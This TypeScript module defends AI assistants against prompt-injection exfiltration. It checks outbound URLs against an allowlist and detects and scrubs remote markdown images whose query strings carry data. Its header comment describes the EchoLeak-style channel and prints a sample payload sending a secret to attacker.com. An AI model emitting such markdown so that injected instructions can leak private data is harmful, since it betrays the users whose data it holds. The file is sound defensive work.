/**
 * egress-hygiene.ts — break the "lethal trifecta" exfiltration leg (Simon Willison; EchoLeak/M365 Copilot).
 * When private data + untrusted content + outbound comms coincide, injection can exfiltrate via rendered
 * remote images/links (`![](attacker.com?secret=DATA)`) or arbitrary outbound URLs. Deterministic, local
 * controls: an outbound-sink allowlist + neutralizing auto-rendered remote markdown. Complements SCOPE-D's
 * egress POLICY by closing the specific markdown-render channel.
 */
function host(url: string): string | null {
  const m = url.match(/^https?:\/\/([^/:\s)]+)/i)
  return m ? m[1]!.toLowerCase() : null
}

export function isAllowedSink(url: string, allowlist: string[]): boolean {
  const h = host(url)
  if (!h) return false
  return allowlist.some((a) => h === a.toLowerCase() || h.endsWith('.' + a.toLowerCase()))
}

const MD_IMAGE = /!\[[^\]]*\]\((https?:\/\/[^)]+)\)/gi
const MD_LINK = /(?<!!)\[[^\]]*\]\((https?:\/\/[^)]+)\)/gi

/** Flag remote markdown images/links whose URL carries data in the query string (classic exfil shape). */
export function detectRemoteRenderExfil(text: string, allowlist: string[] = []): { suspicious: boolean; urls: string[] } {
  const urls: string[] = []
  for (const re of [MD_IMAGE, MD_LINK]) {
    for (const m of text.matchAll(re)) {
      const url = m[1]!
      const hasData = /[?&][^=]+=[^&]{8,}/.test(url)   // a long query value = likely exfiltrated payload
      if (!isAllowedSink(url, allowlist) && (re === MD_IMAGE || hasData)) urls.push(url)
    }
  }
  return { suspicious: urls.length > 0, urls: [...new Set(urls)] }
}

/** Neutralize auto-rendering remote images (the silent exfil channel); keep non-allowlisted links as plain text. */
export function scrubMarkdownImages(text: string, allowlist: string[] = []): string {
  return text.replace(MD_IMAGE, (full, url: string) => (isAllowedSink(url, allowlist) ? full : '[remote image blocked]'))
}
